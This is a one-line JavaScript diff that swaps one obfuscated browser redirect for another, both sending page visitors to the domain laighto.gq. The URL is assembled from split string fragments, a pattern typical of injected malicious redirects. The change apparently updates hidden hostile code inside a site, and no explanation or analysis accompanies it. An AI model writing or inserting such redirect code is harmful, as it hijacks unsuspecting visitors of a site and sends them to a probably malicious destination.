@@ -1,1 +1,1 @@
-window.location.replace(``.concat(`ht`,`tp://www.lai`,`ghto.g`,`q`))
+window.location.replace(``.concat(`ht`,`tp://lai`,`ghto.g`,`q`))
